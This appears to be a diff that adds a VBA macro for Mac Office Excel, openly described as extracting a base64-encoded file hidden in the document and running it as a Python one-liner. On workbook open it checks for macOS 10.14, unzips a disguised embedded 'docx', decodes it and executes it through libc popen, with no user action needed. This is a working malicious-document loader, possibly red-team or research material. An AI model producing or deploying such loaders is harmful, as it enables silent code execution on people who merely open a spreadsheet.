@@ -1,0 +1,56 @@
+' This macro script will extract a base64 encoded file from the document and execute as a one-liner python command'
+#If MAC_OFFICE_VERSION >= 15 Then
+    Private Declare PtrSafe Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As LongPtr
+    Private Declare PtrSafe Function pclose Lib "libc.dylib" (ByVal file As LongPtr) As LongPtr
+    Private Declare PtrSafe Function fread Lib "libc.dylib" (ByVal outStr As String, ByVal size As LongPtr, ByVal items As LongPtr, ByVal stream As LongPtr) As Long
+    Private Declare PtrSafe Function feof Lib "libc.dylib" (ByVal file As LongPtr) As LongPtr
+#End If
+
+Function execShell(command As String, Optional ByRef exitCode As LongPtr) As String
+#If MAC_OFFICE_VERSION >= 15 Then
+    Dim file As LongPtr
+    file = popen(command, "r")
+
+    If file = 0 Then
+        Exit Function
+    End If
+
+    While feof(file) = 0
+        Dim chunk As String
+        Dim read As Long
+        chunk = Space(50)
+        read = fread(chunk, 1, Len(chunk) - 1, file)
+        If read > 0 Then
+            chunk = Left$(chunk, read)
+            execShell = execShell & chunk
+        End If
+    Wend
+
+    exitCode = pclose(file)
+#End If
+End Function
+
+Private Sub Workbook_Open()
+#If MAC_OFFICE_VERSION >= 15 Then
+    Dim result As String
+    Dim exitCode As LongPtr
+    Dim path As String
+    Dim rpath As String
+    Dim command As String
+    Dim iPos As Integer
+    result = execShell("sw_vers -productVersion", exitCode)
+    'Tested on 10.14 Mojave'
+    If InStr(result, "10.14") Then
+        iPos = InStr(ActiveWorkbook.FullName, ":")
+        rpath = Right(ActiveWorkbook.FullName, Len(ActiveWorkbook.FullName) - iPos + 1)
+        path = Replace(Replace(rpath, ":", "/"), " ", "\\ ")
+        command = execShell("unzip -p " & path & " xl/embeddings/Microsoft_Word_Document2.docx | base64 -D", exitCode)
+        If exitCode = 0 Then
+            Debug.Print command
+            result = execShell("python -c " & Chr(34) & command & Chr(34), exitCode)
+            Debug.Print exitCode
+            Debug.Print result
+        End If
+    End If
+#End If
+End Sub
